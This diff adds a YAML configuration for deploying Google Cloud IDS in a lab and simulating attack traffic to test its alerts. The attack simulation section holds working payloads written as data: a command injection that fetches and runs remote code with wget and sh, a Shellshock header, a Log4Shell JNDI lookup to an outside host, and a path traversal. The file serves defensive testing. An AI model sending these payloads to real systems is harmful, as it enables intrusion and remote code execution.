@@ -1,0 +1,128 @@
+# ==============================================================================
+# Google Cloud IDS (Intrusion Detection System) — Deployment & Test Configuration
+# Workflow: Packet Mirroring Policy ──> Simulate Attack Traffic ──> View Threat Alerts
+# ==============================================================================
+
+# Fill in your target GCP Project ID here (or pass --project <PROJECT_ID> to scripts)
+project_id: "YOUR_PROJECT_ID"
+region: "us-central1"
+zone: "us-central1-a"
+
+# ------------------------------------------------------------------------------
+# Network & Private Services Access (PSA) Configuration
+# ------------------------------------------------------------------------------
+network:
+  vpc_name: "cloud-ids-vpc"
+  subnet_name: "cloud-ids-subnet"
+  subnet_cidr: "192.168.10.0/24"
+  psa_range_name: "google-managed-services-cloud-ids"
+  psa_prefix_length: 24
+  router_name: "cloud-ids-nat-router"
+  nat_name: "cloud-ids-nat-gw"
+
+# ------------------------------------------------------------------------------
+# 1. IDS Endpoint — Managed IDS Endpoint Collector in Target VPC
+# ------------------------------------------------------------------------------
+ids_endpoint:
+  name: "cloud-ids-endpoint-01"
+  # Minimum threat severity to alert on: INFORMATIONAL | LOW | MEDIUM | HIGH
+  severity: "INFORMATIONAL"
+  enable_traffic_logs: true
+  threat_exceptions: []
+
+# ------------------------------------------------------------------------------
+# 2. Target VMs — Client VM (Attacker) & Server VM (Target)
+# ------------------------------------------------------------------------------
+target_vms:
+  image_family: "debian-12"
+  image_project: "debian-cloud"
+  shielded_vm:
+    enable_secure_boot: true
+    enable_vtpm: true
+    enable_integrity_monitoring: true
+  server_vm:
+    name: "ids-target-server"
+    machine_type: "e2-medium"
+    internal_ip: "192.168.10.10"
+    tags:
+      - "ids-monitored"
+      - "ids-target-server"
+    services:
+      - "apache2"
+      - "eicar-test-payload"
+  client_vm:
+    name: "ids-attacker-client"
+    machine_type: "e2-medium"
+    internal_ip: "192.168.10.20"
+    tags:
+      - "ids-monitored"
+      - "ids-attacker-client"
+
+# ------------------------------------------------------------------------------
+# 3. Packet Mirroring — Copy Traffic from VMs / GKE Pods to IDS Endpoint
+# ------------------------------------------------------------------------------
+packet_mirroring:
+  policy_name: "cloud-ids-packet-mirroring"
+  description: "Mirrors all ingress/egress traffic from Target VMs & Subnet to Cloud IDS Endpoint"
+  enable: "TRUE"
+  direction: "BOTH" # INGRESS | EGRESS | BOTH
+  mirror_subnet: true
+  # Optional filter protocols (empty list = mirror all IP protocols)
+  filter_protocols: []
+  filter_cidr_ranges:
+    - "0.0.0.0/0"
+
+# ------------------------------------------------------------------------------
+# 4. Attack Simulation — Safe Curl Test Cases Run from Client VM (Attacker)
+# ------------------------------------------------------------------------------
+attack_simulation:
+  target_ip: "192.168.10.10"
+  delay_between_tests_sec: 2
+  test_cases:
+    - id: "TC-01"
+      name: "OS Command Injection / Web Login CGI Probe"
+      expected_severity: "LOW"
+      category: "Command Injection / Web Scan"
+      path: "/weblogin.cgi?username=admin';cd%20/tmp;wget%20http://123.123.123.123/evil;sh%20evil;rm%20evil"
+      headers: {}
+    - id: "TC-02"
+      name: "Directory Traversal (WINNT/win.ini)"
+      expected_severity: "MEDIUM"
+      category: "Path Traversal / File Inclusion"
+      path: "/?item=../../../../WINNT/win.ini"
+      headers: {}
+    - id: "TC-03"
+      name: "GNU Bash Remote Code Execution (Shellshock CVE-2014-6271)"
+      expected_severity: "HIGH"
+      category: "Remote Code Execution (CVE-2014-6271)"
+      path: "/cgi-bin/test-critical"
+      headers:
+        User-Agent: "() { :; }; 123.123.123.123:9999"
+    - id: "TC-04"
+      name: "Apache Log4j JNDI Lookup Exploit Probe (Log4Shell CVE-2021-44228)"
+      expected_severity: "CRITICAL"
+      category: "Remote Code Execution (CVE-2021-44228)"
+      path: "/"
+      headers:
+        X-Api-Version: "${jndi:ldap://123.123.123.123:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}"
+    - id: "TC-05"
+      name: "EICAR Standard Anti-Malware Test Payload Transfer"
+      expected_severity: "HIGH"
+      category: "Malware / Spyware Download"
+      path: "/eicar.file"
+      headers: {}
+
+# ------------------------------------------------------------------------------
+# 5. Verification — Cloud Logging & Cloud Console Threat Queries
+# ------------------------------------------------------------------------------
+verification:
+  threat_log_filter: 'resource.type="ids.googleapis.com/Endpoint" AND logName:"ids.googleapis.com%2Fthreat"'
+  traffic_log_filter: 'resource.type="ids.googleapis.com/Endpoint" AND logName:"ids.googleapis.com%2Ftraffic"'
+  lookback_minutes: 60
+  max_results: 25
+  poll_attempts: 6
+  poll_interval_sec: 15
+
+# Legacy SAIF Demo Compatibility Settings
+persona: "both"
+serve_port: 8080
